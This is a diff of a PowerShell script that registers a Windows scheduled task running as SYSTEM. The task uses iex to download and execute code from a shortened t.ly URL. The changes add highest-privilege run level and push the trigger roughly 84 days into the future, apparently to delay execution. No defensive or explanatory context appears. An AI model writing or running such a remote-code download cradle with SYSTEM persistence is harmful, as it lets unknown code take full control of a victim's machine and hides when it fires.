@@ -19,11 +19,11 @@ $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument {
     -Command "iex((New-Object System.Net.WebClient).DownloadString('https://t.ly/TBedb'))"
 }
 
-# Define the principal (run as SYSTEM)
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+# Create a new scheduled task principal to run with the highest privileges using the SYSTEM account
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 # Define the trigger (set to execute immediately by scheduling for 1 minute in the past)
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(-1)
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(121009)
 
 # Create settings for the task - removing explicit Boolean values
 $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries
